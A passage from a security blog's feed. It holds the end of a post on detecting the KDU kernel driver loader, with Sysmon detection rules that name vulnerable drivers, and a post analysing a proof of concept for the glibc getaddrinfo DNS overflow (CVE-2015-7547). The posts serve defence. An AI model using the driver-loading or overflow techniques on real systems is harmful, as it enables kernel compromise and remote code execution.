      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This is exciting, as file writes are also solid ways of detecting malicious activity, especially if the write operations are hardcoded into the executable and not generated on the fly or randomly.&lt;/p&gt;
&lt;h2&gt;Dynamic Analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;dynamic-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#dynamic-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now that we have some potential indicators of execution for KDU from the source code: registry writes, files writes and image loads, we’re going to write some tests to see how this works in practice. To test these providers, I compiled KDU from source, wrote a custom kernel mode driver that acts as a tiny example rootkit, and wrote a batch script to execute &lt;strong&gt;&lt;code&gt;kdu -map -prv &amp;lt;ID&amp;gt; rootkit.sys&lt;/code&gt;&lt;/strong&gt; repeatedly with each of the providers in sequence. In each case we analyse the changes made to the system, in this example we’ll be using Procmon, and Sysmon.&lt;/p&gt;
&lt;p&gt;The procmon test shows a pretty clear pattern of events demonstrated by the following diagram:&lt;/p&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/image-1024x409.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;Sysmon output&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;Using our custom Sysmon config, we also see the following events traced by Sysmon: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create %TEMP%&lt;strong&gt;PROVIDER&lt;/strong&gt;.sys &lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROVIDER&lt;/strong&gt;Start registry value to 3 (Manual Start)&lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROVIDER&lt;/strong&gt;ImagePath to %TEMP%&lt;strong&gt;PROVIDER&lt;/strong&gt;.sys&lt;/li&gt;
&lt;li&gt;&lt;em&gt;DRIVER LOADED&lt;/em&gt;&lt;strong&gt;&lt;em&gt;: PROVIDER.sys&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Create %CD%&lt;strong&gt;PROCEXP152&lt;/strong&gt;.sys&lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROCEXP152&lt;/strong&gt;Start registry value to 3 (Manual Start)&lt;/li&gt;
&lt;li&gt;Set HKLMSystemCurrentControlSetServices&lt;strong&gt;PROCEXP152&lt;/strong&gt;ImagePath to %CD%&lt;strong&gt;PROCEXP152&lt;/strong&gt;.sys&lt;/li&gt;
&lt;li&gt;&lt;em&gt;DRIVER LOADED&lt;/em&gt;&lt;strong&gt;&lt;em&gt;: PROCEXP152.sys&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Unsigned Image loaded &lt;strong&gt;rootkit.sys&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This makes more sense if we understand that the registry values in &lt;strong&gt;HKLMSystemCurrentControlSetServices&lt;Driver&gt;&lt;/strong&gt; are set and unset when Windows services are loaded, and these actions aren’t actually performed by the KDU code directly. Instead these events can be read as:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Unpack vulnerable (provider) driver to &lt;code&gt;%CD%&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start it&lt;/li&gt;
&lt;li&gt;Write rootkit binary data to &lt;code&gt;HKLM~&lt;/code&gt; registry hive&lt;/li&gt;
&lt;li&gt;Unpack victim driver (&lt;code&gt;**PROCEXP152**.sys&lt;/code&gt;) to &lt;code&gt;%TEMP%&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start it&lt;/li&gt;
&lt;li&gt;Unsigned rootkit kernel driver loaded into kernel memory&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This is almost exactly the pattern evident from the source code, although we had to add an explicit rule to pick up the binary data in &lt;code&gt;HKLM~&lt;/code&gt;. What we can note here as well is that this entire process relies on the loading of a very particular version of a vulnerable driver - this means it’ll have a particular hash which we could also use as a signature, as well as the final event - an unsigned driver still gets loaded into memory is the biggest telltale sign of something suspicious happening.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now, &lt;a href=&#34;https://www.reddit.com/r/blueteamsec/comments/fychxz/detect_ghostinthelogs_when_executed_disables_all/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;obviously we could have just executed KDU right at the start of this and obtained the IOC’s instantly, but where’s the fun in that&lt;/a&gt;? Instead you should now understand one fairly general technique for elevating from system to kernel, the inner workings of kernel level driver loaders (and the many similar tools using this technique), as well as how we can detect them. &lt;/p&gt;
&lt;p&gt;These detection techniques aren’t particularly sophisticated however, and nothing prevents an adversary from patching or tweaking these variables so KDU writes to different registry hives or disk locations. Or worse yet, making it load the victim and vulnerable drivers from memory instead of dumping them to disk first, in which case we would only see the starting and stopping of the vulnerable and victim driver services. Then simply patching the vulnerable drivers with arbitrary null bytes before loading them would modify the hashes detected by Sysmon. Such is life in cybersecurity… In part 2 we’re going to look at some more sophisticated evasion techniques that rootkits use, and how we can detect those too, so stay tuned!&lt;/p&gt;
&lt;p&gt;The supporting work in this area is my only credit, people like &lt;a href=&#34;https://twitter.com/hFireF0X&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@hfiref0x&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/FuzzySec&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@fuzzysec&lt;/a&gt;, and of course our dude &lt;a href=&#34;https://twitter.com/_batsec_&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@_batsec_&lt;/a&gt; constantly finding ways to break the Windows kernel and invalidate the integrity of our operating systems is one of the many wonders of this world. &lt;/p&gt;
&lt;h2&gt;Appendix&lt;span class=&#34;absolute -mt-20&#34; id=&#34;appendix&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#appendix&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Some sysmon rules for detecting KDU and similar tools (the DriverLoad and ImageLoad events may require you to update your exclusion filters) as the vulnerable drivers that get loaded often appear legitimate and are even signed by Microsoft in the case of &lt;code&gt;**PROCEXP152**.sys&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.23&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;or&amp;#34;&amp;gt;
            &amp;lt;DriverLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;ImageLoaded condition=&amp;#34;contains&amp;#34; name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34;&amp;gt;TempPROCEXP152.sys&amp;lt;/ImageLoaded&amp;gt;
                &amp;lt;Hashes condition=&amp;#34;is&amp;#34; name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34;&amp;gt;C06DDA757B92E79540551EFD00B99D4B&amp;lt;/Hashes&amp;gt;
            &amp;lt;/DriverLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;or&amp;#34;&amp;gt;
            &amp;lt;ImageLoad onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;Signed name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;is&amp;#34;&amp;gt;false&amp;lt;/Signed&amp;gt;
                &amp;lt;ImageLoaded name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;is&amp;#34;&amp;gt;C:WindowsSystem32ntoskrnl.exe&amp;lt;/ImageLoaded&amp;gt;
            &amp;lt;/ImageLoad&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;FileCreate onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;TargetFilename name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;AppDataLocalTempPROCEXP152.sys&amp;lt;/TargetFilename&amp;gt;
            &amp;lt;/FileCreate&amp;gt;
&amp;lt;FileCreate onmatch=&amp;#34;exclude&amp;#34;&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procexp64.exe&amp;lt;/Image&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procexp.exe&amp;lt;/Image&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procmon64.exe&amp;lt;/Image&amp;gt;
                &amp;lt;Image condition=&amp;#34;contains&amp;#34;&amp;gt;procmon.exe&amp;lt;/Image&amp;gt;
            &amp;lt;/FileCreate&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;&amp;#34; groupRelation=&amp;#34;or&amp;#34;&amp;gt;
            &amp;lt;RegistryEvent onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;PROCEXP152ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;RTCore64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;GdrvImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;ATSZIOImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;MsIo64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;MsIoImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;GLCKIo2ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneIo64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneIoImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;WinRing0x64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;WinRing0_1_2_0ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneTechIo64ImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;EneTechIoImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;NalDrvImagePath&amp;lt;/TargetObject&amp;gt;
                &amp;lt;TargetObject name=&amp;#34;MITRE_REF=T1014,NAME=Rootkit&amp;#34; condition=&amp;#34;contains&amp;#34;&amp;gt;HKLM~&amp;lt;/TargetObject&amp;gt;
            &amp;lt;/RegistryEvent&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;ol&gt;
&lt;li&gt;A basic PowerShell script for incident responders to help perform analysis on target machines. The script simply recurses through the entire &lt;code&gt;HKLM&lt;/code&gt; registry space and checks for any executable data (by checking the PE header magic bytes and length of the entry).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/thomjs/e7c5f6087ff646acf32dae89e9c7ecf2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://gist.github.com/thomjs/e7c5f6087ff646acf32dae89e9c7ecf2&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;References&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hfiref0x/KDU/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/hfiref0x/KDU/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://swapcontext.blogspot.com/2020/01/unwinding-rtcore.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://swapcontext.blogspot.com/2020/01/unwinding-rtcore.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://eclypsium.com/wp-content/uploads/sites/2/2019/08/EXTERNAL-Get-off-the-kernel-if-you-cant-drive-DEFCON27.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://eclypsium.com/wp-content/uploads/sites/2/2019/08/EXTERNAL-Get-off-the-kernel-if-you-cant-drive-DEFCON27.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-privilege-vulnerabilities&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.fuzzysecurity.com/tutorials/expDev/23.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.fuzzysecurity.com/tutorials/expDev/23.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

      </description>
    </item>
    
    <item>
      <title>CVE 2015-7547 glibc getaddrinfo() DNS Vulnerability</title>
      <link>//localhost:1313/articles/2016/03/2016-03-07-cve-2015-7547-glibc-getaddrinfo-dns-vulnerability/</link>
      <pubDate>Mon, 07 Mar 2016 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2016/03/2016-03-07-cve-2015-7547-glibc-getaddrinfo-dns-vulnerability/</guid>
      <description>
        
        
        &lt;p&gt;Hello w0rld! JUMPSEC researchers have spent some time on the glibc DNS vulnerability indexed as CVE 2015-7547 (It hasn’t got a cool name like GHOST unfortunately…). It appears to be a highly critical vulnerability and covers a large number of systems. It allows remote code execution by a stack-based overflow in the client side DNS resolver. In this post we would like to present our analysis.&lt;/p&gt;
&lt;h2&gt;Google POC overview&lt;span class=&#34;absolute -mt-20&#34; id=&#34;google-poc-overview&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#google-poc-overview&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/1sts.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/1sts.png&#34; alt=&#34;1sts&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Google POC Network Exploitation Timeline&lt;span class=&#34;absolute -mt-20&#34; id=&#34;google-poc-network-exploitation-timeline&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#google-poc-network-exploitation-timeline&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/draw-io_glibc-1.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/draw-io_glibc-1.png&#34; alt=&#34;draw-io_glibc (1)&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Google POC Exploit Code Analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;google-poc-exploit-code-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#google-poc-exploit-code-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;First response&lt;span class=&#34;absolute -mt-20&#34; id=&#34;first-response&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#first-response&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;[caption id=&amp;ldquo;attachment_184&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;741&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/test.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/test.png&#34; alt=&#34;test&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Code snippet[/caption]&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter1.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter1.png&#34; alt=&#34;alter1&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Packet capture snippet&lt;/p&gt;
&lt;p&gt;The dw() function calls a “struct” module from python library. According to the documentation, it performs conversion between python values and C structs represented as python strings. In this case, it interprets python integer and pack it into little-endian short type binary data. This is a valid response sent by the “malicious” DNS server when it receives any initial queries. This response packet is constructed intentionally in large size (with 2500 bytes of null), it forces the client to retry over TCP and allocate additional memory buffer for the next response. This also triggers the dual DNS query from getaddrinfo() on the client side, which is a single request containing A and AAAA queries concatnated.&lt;/p&gt;
&lt;h3&gt;Second Response&lt;span class=&#34;absolute -mt-20&#34; id=&#34;second-response&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#second-response&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;[caption id=&amp;ldquo;attachment_162&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;531&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter3.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter3.png&#34; alt=&#34;alter3&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Code snippet[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_163&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;484&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter4.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter4.png&#34; alt=&#34;alter4&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Packet capture snippet[/caption]&lt;/p&gt;
&lt;p&gt;This is the second response sent by the malicious DNS server. It is a malformed packet sending large numbers of “fake records” (184 Answer RRs) back to the client. According to google, this forces __libc_res_nsend to retry the query.&lt;/p&gt;
&lt;h3&gt;Third response&lt;span class=&#34;absolute -mt-20&#34; id=&#34;thirdresponse&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#thirdresponse&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;[caption id=&amp;ldquo;attachment_164&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;482&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter5.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter5.png&#34; alt=&#34;alter5&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Code snippet[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_165&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;493&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter5b.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter5b.png&#34; alt=&#34;alter5b&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Packet capture snippet[/caption]&lt;/p&gt;
&lt;p&gt;This is the third response sent by the “malicious” DNS server. It is another malformed packet which is carrying the payload. JUMPSEC researcher has modified the Google POC code to identify the the number of bytes to cause a segmentation fault (possibly overwriting the RET address) of the buffer. It is found that the RET address is being overwritten on the 2079th byte. With the addition of return_to_libc technique, an attacker can bypass OS protection such as NX bit or ASLR and perform remote code execution.&lt;/p&gt;
&lt;h2&gt;Google POC debugging and crash analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;google-poc-debugging-and-crash-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#google-poc-debugging-and-crash-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;JUMPSEC has run it through the trusty gdb. It crashes with a SEGMENTATION FAULT which verifies that the DNS response has smashed the stack of the vulnerable client application when running getaddrinfo(). The vulnerable buffer is operated in gaih_getanswer. The entry address has been overwritten with 0x4443424144434241 (ABCDABCD). The state of the register also showing the overflowed bytes.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_166&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;888&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter6.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter6.png&#34; alt=&#34;alter6&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; SEGFAULT from vulnerable client. RET address is overwritten with “ABCDABCD”[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_167&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;889&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter7.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter7.png&#34; alt=&#34;alter7&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Backtrack[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_194&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;666&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/cropped.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/cropped.png&#34; alt=&#34;cropped&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Registers[/caption]&lt;/p&gt;
&lt;p&gt;JUMPSEC has also tested it on a few other applications. It was found that the getaddrinfo() function in glibc is commonly used…&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter9.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter9.png&#34; alt=&#34;alter9&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_170&amp;rdquo; align=&amp;ldquo;alignleft&amp;rdquo; width=&amp;ldquo;938&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter10.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter10.png&#34; alt=&#34;alter10&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Iceweasel crashing[/caption]&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The best way to mitigate this issue is to enforce proper patching management. Make sure to update all your systems with the latest version of glibc . If you have any systems exposed on the internet and you want to make sure that this vulnerability is not triggered then the following Wireshark filter could be useful: (DNS.length&amp;gt;2048 to see malformed packets). A DNS response has a maximum of 512 bytes (typically), note that the DNS reply is truncated. Even if the client does not accept large response, smaller responses can be combine into a large one which can also trigger the vulnerability. A possible filter is to monitor the size of the entire conversation as a distinct amount of bytes in total is require to trigger specific responses from vulnerable client and all of them requires more than 2048 bytes.&lt;/p&gt;
&lt;p&gt;The above vulnerability can be fixed by patching. If you are running RedHat or CentOS a simple&lt;/p&gt;
&lt;p&gt;&lt;em&gt;yum -y update glibc&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;will update the libc and resolve the issue (remember to restart the service right after the update!).&lt;/p&gt;
&lt;h2&gt;Reference links&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reference-links&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reference-links&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7547&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7547&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://pubs.opengroup.org/onlinepubs/9699919799/functions/freeaddrinfo.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://pubs.opengroup.org/onlinepubs/9699919799/functions/freeaddrinfo.html&lt;/a&gt;&lt;/p&gt;
